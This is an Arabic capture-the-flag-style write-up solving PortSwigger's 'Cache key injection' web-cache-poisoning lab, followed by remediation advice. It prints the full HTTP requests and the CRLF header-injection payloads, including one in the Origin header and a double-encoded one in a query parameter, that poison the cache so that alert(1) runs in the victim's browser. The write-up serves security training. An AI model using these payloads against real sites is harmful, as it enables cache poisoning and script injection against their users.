# [Cache key injection](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-cache-key-injection)

## **`الهدف`**
قم بجمع عدة ثغرات أمنية لتنفيذ `alert(1)` في متصفح الضحية.
## **`خطوات الحل`**
سنقوم بتوجيه الطلب الخاص بـ `/login?lang=en` إلى `Rpeater`
```http
GET /login?lang=en HTTP/2
Host: 0ae700b80313b8be8039305b00af003b.web-security-academy.net
Cookie: session=Z2ZrNpo0xbHxrX4AEIPrSWVxtc0zRPti; lang=en; session=spyKbEs7oH67Oyj7mB2ZhTxorJI0KuWN
```

وسنلاحظ أنه إذا قمنا بإضافة معلم `utm_content` فإنه غير مؤرشف في مفتاح ذاكرة التخزين المؤقت.

والان سنبحث قليلًا في الـ `HTTP history` وسنجد هذا الطلب لملف `JS`
```http
GET /js/localize.js?lang=en&cors=0 HTTP/2
Host: 0ae700b80313b8be8039305b00af003b.web-security-academy.net
Cookie: session=spyKbEs7oH67Oyj7mB2ZhTxorJI0KuWN
```
وهذه هي استجابته
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 28

document.cookie = 'lang=en';
```

وسنقوم بإعادة إرسال الطلب بعد إضافة ترويسة `Pragma: x-get-cache-key` لمعرفة كيف يقوم بتكوين مفتاح ذاكرة التخزين المؤقت، 
```http
GET /js/localize.js?lang=en&cors=0 HTTP/2
Host: 0ae700b80313b8be8039305b00af003b.web-security-academy.net
Cookie: session=spyKbEs7oH67Oyj7mB2ZhTxorJI0KuWN
Pragma: x-get-cache-key
```
فستكون الاستجابة كالتالي:
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 8
X-Cache-Key: /js/localize.js?lang=en&cors=0$$
X-Cache: hit
Content-Length: 28

document.cookie = 'lang=en';
```

والأن سنقوم بتعديل قيمة `cors` إلى `1` لأن هذا سيجعله معرض لحقن ترويسة `Access-Control-Allow-Origin` في الاستجابة عن طريق ترويسة `Origin` الموجودة في الطلب.
```http
GET /js/localize.js?lang=en?utm_content=z&cors=1&x=1 HTTP/2
Origin: x%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)$$$$
Host: 0ae700b80313b8be8039305b00af003b.web-security-academy.net
Cookie: session=spyKbEs7oH67Oyj7mB2ZhTxorJI0KuWN
```
وسنجد أن الاستجابة كالتالي:
```http
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: x
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 8

alert(1)
```

حيث أن الـ `Payload` المحقون في ترويسة `Origin` قبل الترميز كان كالتالي:
```http
Origin: x\r\nContent-Length: 8\r\n\r\nalert(1)$$$$
```
وهذا يعنى أن: 
- الـ `x` هي قيمة ترويسة `Access-Control-Allow-Origin` 
- الـ `\r\n` والتي تعني أنه سينزل سطرًا واحدة
- ترويسة `Content-Length` بقيمة `8` ثم `\r\n\r\n` والتي تعني نزول سطرين وراء بعض وهذا للفصل بين الترويسات ومحتوى الطلب `Body` 
-  الـ `alert(1)`وهو  الكود الذي سيتم تنفيذه والتي عدد أحرفها `8` ليطابق القيمة الموجودة في ترويسة `Content-Length`
- أربع علامات دولار `$ّ` ولا أعرف التفسير الدقيق لهم ولكن له علاقة بآلية إنشاء مفتاح الكاش في هذا اللاب.

وبعد ذلك سنقوم بتعديل طلب `/login?lang=en` كالتالي:
```http
GET /login?lang=en?utm_content=x%26cors=1%26x=1$$origin=x%250d%250aContent-Length:%208%250d%250a%250d%250aalert(1)$$%23 HTTP/2
Host: 0ae700b80313b8be8039305b00af003b.web-security-academy.net
Cookie: session=Z2ZrNpo0xbHxrX4AEIPrSWVxtc0zRPti; lang=en; session=spyKbEs7oH67Oyj7mB2ZhTxorJI0KuWN
```
حيث أن الـ `Payload` المحقون في المعلم قبل الترميز كان كالتالي:
```http
GET /login?lang=en?utm_content=x&cors=1&x=1$$origin=x\r\nContent-Length: 8\r\n\r\nalert(1)$$#
```
وهو نفس الـ `Payload` السابق ولكن بإختلافات بسيطة: 
- علامتى الدولار هنا أيضًا لا أعرف التفسير الدقيق لهم ولكن له علاقة بآلية إنشاء مفتاح الكاش في هذا اللاب
- علامة `#` ليتم تجاهل أى شئ قد يأتي بعد المعلم في الـ `URL`
- وجود `Double Encoding` لأن هذا الطلب سيمر بمرحلتين من فك الترميز على العكس من الطلب الأول في ترويسة `Origin` والذي يمر بمرحلة واحدة فقط من فك الترميز.

وبعد ذلك سنقوم بإرسال الطلبين المحقونين بالتوالي وقد نحتاج لتكرار ذلك عدة مرات حتى يتم تجديد الـ `Cache` وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب على سيرفر الويب أو إطار العمل أن يقوم بتنقية جميع المدخلات التي يتم تمريرها إلى ترويسات الاستجابة ورفض أي طلب يحتوي على رموز `\r` أو `\n` داخل قيم الترويسات.

ويجب عدم الوثوق بترويسة `Origin` بشكل أعمى، حيث يتم إعداد التطبيق ليعتمد على قائمة بيضاء تحتوي فقط على النطاقات  الموثوقة التي يُسمح لها بالوصول إلى الموارد، وإذا كان الـ `Origin` المرسل غير موجود في القائمة البيضاء، فلا يجب طباعة ترويسة `Access-Control-Allow-Origin` من الأساس.

ويجب إعداد الـ `Middleware` أو سيرفر الويب (مثل `Nginx` أو `Apache`) ليتجاهل أو يحذف  أى معلم لا يدخل في تكوين مفتاح ذاكرة التخزين المؤقت  تماماً من أي `Request` قادم قبل أن يصل إلى الواجهة الخلفية `back-end.
